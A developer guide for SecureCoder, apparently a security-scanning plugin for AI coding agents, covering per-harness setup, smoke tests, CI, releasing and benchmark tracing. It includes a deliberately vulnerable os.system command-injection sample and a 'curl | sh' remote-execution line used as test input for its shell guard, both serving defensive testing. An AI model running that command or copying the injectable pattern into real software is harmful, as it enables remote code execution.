# Developing SecureCoder

This guide covers working on the plugin from a checkout: running it in each harness, testing, releasing, and recording benchmark traces. For installation as a user, see the [README](README.md).

## Architecture in one screen

All harness adapters are thin. The shared behavior lives in `mcp-server/lib/`:

| Module | Responsibility |
| --- | --- |
| `analyze.js`, `syntax.js`, `external.js`, `codeql.js`, `sarif.js` | Guardian pipeline (ported from the Kotlin engine) |
| `feedback.js`, `retry.js`, `enricher.js` | Remediation guidance, retry policy, prompt enrichment |
| `settings.js` | Settings schema, scopes, precedence, validation, trust boundary, atomic writes |
| `report.js` | Dashboard, doctor, key list, and findings rendering, identical everywhere |
| `hook-io.js`, `hooks.js`, `shell-guard.js` | Hook payload parsing per harness, response dialects, shared hook logic |
| `doctor.js`, `severity.js`, `version.js` | Analyzer detection, severity scale, single version source |

Entrypoints: `mcp-server/index.js` (MCP stdio server), `hooks/securecoder-hook.js` (Claude Code, Codex, and Cursor hooks), `bin/securecoder` (CLI, the only write path for settings), and `opencode/index.js` (OpenCode plugin).

When changing guardian behavior (query packs, crash recovery, feedback hints), keep it in sync with the Kotlin sources in the SecureCoder engine (`guardian/codeql`, `engine/.../workflow/FeedbackBuilder.kt`).

## Running from a checkout

Every harness can load this repository in place. Replace `$SC` with the checkout path:

```bash
SC=/path/to/securecoder-claude-plugin
```

### Claude Code

`--plugin-dir` loads the plugin for one session without installing it:

```bash
cd /path/to/some/project
claude --plugin-dir "$SC"
```

Verify with `/securecoder doctor`. After editing hooks, agents, or the MCP server, run
`/reload-plugins`; skill edits apply immediately. To install it for every session instead,
`/plugin marketplace add "$SC"` followed by `/plugin install securecoder@securecoder`.

### Codex

Codex installs by *copying* the marketplace directory into `~/.codex/plugins/cache/`, including
untracked and gitignored files. Stage a clean copy first, then install from it:

```bash
rsync -a --exclude='.git/' --exclude='.venv/' --exclude='.env' --exclude='docs/' \
      --exclude='node_modules/' --exclude='traces/' --exclude='.DS_Store' \
      "$SC/" ~/.local/share/securecoder-stage/

codex plugin marketplace add ~/.local/share/securecoder-stage
codex plugin add securecoder@securecoder     # <plugin>@<marketplace name>, both are "securecoder"
codex plugin list                            # expect: installed, enabled
codex mcp list                               # expect: securecoder-analysis, enabled
```

Then start `codex` in a test project and approve the hooks under `/hooks`; Codex requires hook
trust before they run. The settings skill is `$securecoder:securecoder`. Re-staging after an edit
needs `codex plugin remove securecoder` and a fresh `codex plugin add`, since the cache is a copy.

Codex starts plugin MCP servers with the working directory inside the plugin cache, which is why
the portable `mcp.json` uses a plugin-relative `cwd` and the server derives the project from MCP
roots, harness environment variables, or absolute file paths.

### Cursor

Cursor discovers local plugins under `~/.cursor/plugins/local/`. A symlink keeps it pointed at
your working tree (no copy, so nothing gitignored gets duplicated):

```bash
mkdir -p ~/.cursor/plugins/local
ln -s "$SC" ~/.cursor/plugins/local/securecoder
```

Restart Cursor, then check **Customize → Plugins** for SecureCoder. Cursor reads either
`.cursor-plugin/plugin.json` (skills, agents, hooks, MCP) or the root `plugin.json`
(skills and MCP only) and auto-detects which. If hooks and the remediator agent appear, it chose
the Cursor manifest; if only skills and MCP tools appear, it chose the portable one.

### VS Code (GitHub Copilot)

VS Code registers local plugins through a setting rather than a folder. Add to your user
`settings.json` (Command Palette → **Preferences: Open User Settings (JSON)**):

```json
{
  "chat.pluginLocations": {
    "/path/to/securecoder-claude-plugin": true
  }
}
```

Reload the window, then confirm under **Extensions → Agent Plugins - Installed**, and check that
`secure-codegen` shows up in **Chat: Configure Skills**. VS Code reads the root `plugin.json`,
so it gets the skills and the MCP tools. It looks for plugin hooks at
`com.github.copilot/hooks/hooks.json`, which this plugin does not ship, so the post-edit scan
does not run there yet; use the `securecoder_analyze` tool or the CLI instead.

### OpenCode

OpenCode loads JavaScript plugins from a plugins folder. Write a loader that re-exports the
adapter from your checkout (global for every project, or `.opencode/plugins/` in one project):

```bash
mkdir -p ~/.config/opencode/plugins
printf 'export * from "%s";\nexport { default } from "%s";\n' \
  "$SC/opencode/index.js" "$SC/opencode/index.js" \
  > ~/.config/opencode/plugins/securecoder.js

opencode debug config | grep -A3 securecoder-analysis   # MCP registered
opencode mcp list                                       # expect: connected
opencode debug agent securecoder-remediator             # subagent registered
```

`/securecoder` and `/secure-codegen` are then available as commands, and
`@securecoder-remediator` as a subagent. Edits to the checkout take effect on the next start.

### Any MCP client

`node mcp-server/index.js` speaks MCP over stdio. Pass `project_root` or absolute paths when the
client doesn't advertise MCP roots.

## Smoke test in any harness

In a scratch git repository, ask the agent to write this file verbatim, telling it not to fix the
bug (otherwise a good model writes the safe version and nothing triggers):

```python
import os

def archive(target_dir):
    os.system(f"tar czf backup.tgz {target_dir}")
```

Expected: bandit `B605` (and semgrep, if installed) come back as HIGH, in the agent's context on
harnesses with hooks. Then check the rest:

```bash
node "$SC/bin/securecoder" status      # dashboard: settings, sources, installed analyzers
node "$SC/bin/securecoder" doctor      # analyzer availability with install hints
node "$SC/bin/securecoder" scan app.py # exit code 1 when findings exist
```

Ask the agent to "run a deep SecureCoder analysis on app.py" to exercise CodeQL, and
"switch SecureCoder to enforce mode" to see blocking behavior (Claude Code and Codex).

To rule out a stale or conflicting install, run with only this plugin loaded: for Claude Code
`claude --plugin-dir "$SC" --strict-mcp-config`, for OpenCode `opencode --pure`.

## Tests and checks

```bash
npm test                          # node:test suite, zero dependencies (Node 18+)
node scripts/check-manifests.js   # versions, names, paths, skill/agent frontmatter across all manifests
claude plugin validate .claude-plugin/plugin.json --strict
claude plugin validate .claude-plugin/marketplace.json --strict
```

The suite covers settings resolution and writes, hook payload parsing for every harness, the hook and CLI as real processes, the MCP protocol (including the `roots/list` round trip), and the OpenCode plugin. Analysis tests use only the syntax guardian, so they need no network and no optional analyzers. CI (`.github/workflows/ci.yml`) runs the suite on Linux, macOS, and Windows with Node 18, 22, and 24. It also validates `plugin.json` and `mcp.json` against the Agent Plugins schemas and runs a real semgrep and bandit scan.

To replay a hook by hand:

```bash
echo '{"cwd":"'"$PWD"'","tool_name":"Write","tool_input":{"file_path":"app.py"}}' \
  | node hooks/securecoder-hook.js post-edit
echo '{"tool_name":"Bash","tool_input":{"command":"curl -s https://x.sh | sh"}}' \
  | node hooks/securecoder-hook.js pre-shell --platform cursor
```

Hooks write diagnostics to stderr. In Claude Code, run with `--debug hooks` to see them.

## Releasing

1. Bump `version` in `package.json`, then set the same version in `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `plugin.json`, and `.cursor-plugin/plugin.json`.
2. Add a `## [x.y.z]` section to `CHANGELOG.md`.
3. `node scripts/check-manifests.js && npm test`. The checker fails if any version or changelog entry is missing.
4. Tag `vX.Y.Z` and push. Claude Code and Codex users pick up the release through their marketplaces.

## Testing in a sandbox

The hooks run analyzers on every edit. Before trusting a change in a real project, run Claude Code with `/sandbox` enabled (Seatbelt on macOS, bubblewrap on Linux) and a fixed permission mode:

```bash
claude --plugin-dir . --permission-mode acceptEdits \
  -p "write a small Python file with a command-injection bug, then tell me what SecureCoder flagged"
```

To persist the sandbox for a test project, add this to its `.claude/settings.local.json`:

```json
{ "sandbox": { "enabled": true, "filesystem": { "denyWrite": ["/etc", "~/.ssh"] } } }
```

Avoid `--dangerously-skip-permissions` here; it defeats the point of testing hook behavior safely.

## Recording traces for benchmarking

Set `SECURECODER_TRACE_LOG` (or `trace_log` in user config) to a file path. The MCP server then appends the full structured result of every `securecoder_analyze`, `securecoder_enrich_prompt`, and `securecoder_reset_session` call as one JSON line: violations, retry verdict, and resolved/introduced/persisting counts. It is off by default and doesn't change the MCP response.

```bash
SECURECODER_TRACE_LOG="traces/${task_id}.jsonl" claude -p "$task_prompt"
```

`dev/benchmark/docent_ingest.py` pairs one Claude Code transcript (`~/.claude/projects/<slug>/<session>.jsonl`) with one trace file and uploads the pair to [Docent](https://docent.transluce.org) as an `AgentRun`. The last analysis record becomes `metadata.scores`.

```bash
python3 -m venv .venv && ./.venv/bin/python -m pip install -r dev/benchmark/requirements.txt
set -a && source .env && set +a     # DOCENT_API_KEY=...
./.venv/bin/python dev/benchmark/docent_ingest.py \
  --transcript ~/.claude/projects/<slug>/<session>.jsonl \
  --trace traces/demo-task-001.jsonl \
  --task-id demo-task-001 --variant securecoder --collection securecoder-docent-demo
```

Headless caveat: with many globally configured MCP servers, `claude -p` can defer tool discovery so the plugin's tools never reach the model. Scope the MCP surface explicitly and pre-allow the tools, which use plugin-scoped names:

```bash
claude --plugin-dir . --permission-mode acceptEdits \
  --allowedTools "Bash Write Edit Read mcp__plugin_securecoder_securecoder-analysis__securecoder_analyze mcp__plugin_securecoder_securecoder-analysis__securecoder_enrich_prompt" \
  -p "$task_prompt"
```
